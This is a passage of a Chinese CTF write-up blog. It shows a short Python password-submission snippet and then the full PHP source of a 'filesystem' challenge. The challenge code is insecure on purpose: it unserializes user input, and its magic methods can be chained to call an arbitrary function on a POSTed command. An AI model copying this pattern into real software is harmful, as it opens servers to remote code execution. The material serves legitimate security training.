&quot;Enj0yNSSCTF4th!&quot; --k 3 --tries 2000 --seed 0x414141</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">candidate = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2619576310042a5bbf7c24dfa47780&quot;</span>)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://node9.anna.nssctf.cn:29070/&quot;</span>,</span><br><span class="line">                  data=&#123;<span class="string">&quot;pass&quot;</span>: candidate&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="mpga-filesystem"><a href="#mpga-filesystem" class="headerlink" title="[mpga]filesystem"></a>[mpga]filesystem</h2><p>题目有源码，可以直接下载</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contextName</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="string">&#x27;ApplicationContext&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;contextName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$targetFile</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;targetFile = <span class="variable">$targetFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterPath</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;targetFile))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;文件路径不符合规范&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile; </span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileHash</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterPath</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希 (尝试): &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;无法计算MD5哈希，因为文件参数无效: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">            <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionName</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionArguments</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;upload/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;upload_file&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$file_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="keyword">isset</span>(<span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>] : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_extension</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">                <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;不允许的文件类型。只允许 txt, png, gif, jpg。&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$unique_filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file_extension</span>;</span><br><span class="line">                <span class="variable">$upload_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$unique_filename</span>;</span><br><span class="line">                <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_path</span>)) &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-green-600&#x27;&gt;文件上传成功！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$output</span> .= <span class="string">&quot;&lt;p class=&#x27;text-gray-700&#x27;&gt;文件路径：&lt;code class=&#x27;bg-gray-200 p-1 rounded&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$upload_path</span>) . <span class="string">&quot;&lt;/code&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;上传失败！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;请选择一个文件上传。&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;home&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit_md5&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename_param</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename_param</span>)) &#123;</span><br><span class="line">        <span class="variable">$file_object</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_object</span> === <span class="literal">false</span> || !(<span class="variable">$file_object</span> <span class="keyword">instanceof</span> FileManager)) &#123;</span><br><span class="line">            <span class="variable">$file_object</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$file_object</span>-&gt;<span class="title function_ invoke__">getFileHash</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-gray-600&#x27;&gt;请输入文件路径进行MD5校验。&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件管理系统&lt;/title&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Inter&#x27;</span>, sans-serif;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">gray</span>-100 <span class="title">flex</span> <span class="title">items</span>-<span class="title">center</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">min</span>-<span class="title">h</span>-<span class="title">screen</span> <span class="title">px</span>-4 <span class="title">py</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">white</span> <span class="title">p</span>-6 <span class="title">md</span>:<span class="title">p</span>-8 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">shadow</span>-<span class="title">md</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">max</span>-<span class="title">w</span>-4<span class="title">xl</span> <span class="title">mx</span>-<span class="title">auto</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">text</span>-3<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-6 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;文件管理系统&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">flex</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">mb</span>-6 <span class="title">space</span>-<span class="title">x</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">home</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-100 <span class="title">text</span>-<span class="title">indigo</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">indigo</span>-200&#x27;; ?&gt;&quot;&gt;主页&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">blue</span>-100 <span class="title">text</span>-<span class="title">blue</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-200&#x27;; ?&gt;&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">mb</span>-4&quot;&gt;欢迎使用文件管理系统。&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500 <span class="title">mb</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    为了确保文件一致性和完整性，请在下载前校验<span class="title">md5</span>值，完成下载后进行对比。</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;文件列表&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">max</span>-<span class="title">h</span>-60 <span class="title">overflow</span>-<span class="title">y</span>-<span class="title">auto</span> <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">p</span>-2 <span class="title">bg</span>-<span class="title">gray</span>-50&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    $<span class="title">files</span> = <span class="title">array_diff</span>(<span class="title">scandir</span>($<span class="title">upload_dir</span>), <span class="title">array</span>(&#x27;.&#x27;, &#x27;..&#x27;));</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">empty</span>($<span class="title">files</span>)) </span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-gray-500&#x27;&gt;暂无文件。&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;ul class=&#x27;text-left space-y-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                            <span class="variable">$file_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;li class=&#x27;flex items-center justify-between p-2 bg-white rounded-md shadow-sm&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;span class=&#x27;text-gray-700 break-all mr-2&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file</span>) . <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flex space-x-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27; download class=&#x27;bg-blue-500 hover:bg-blue-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;下载&lt;/a&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;?action=home&#x27; method=&#x27;POST&#x27; class=&#x27;inline-block&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;file_to_check&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27;&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;button type=&#x27;submit&#x27; name=&#x27;submit_md5&#x27; class=&#x27;bg-purple-500 hover:bg-purple-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;校验MD5&lt;/button&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$output</span>)): <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;校验结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">elseif</span> ($<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;上传文件&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">space</span>-<span class="title">y</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">text</span>-<span class="title">sm</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-2&quot;&gt;选择文件:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-900 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-300 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">cursor</span>-<span class="title">pointer</span> <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">focus</span>:<span class="title">outline</span>-<span class="title">none</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">w</span>-<span class="title">full</span> <span class="title">bg</span>-<span class="title">blue</span>-500 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">transition</span> <span class="title">duration</span>-300 <span class="title">ease</span>-<span class="title">in</span>-<span class="title">out</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    上传</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">if</span> (!<span class="title">empty</span>($<span class="title">output</span>)): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span 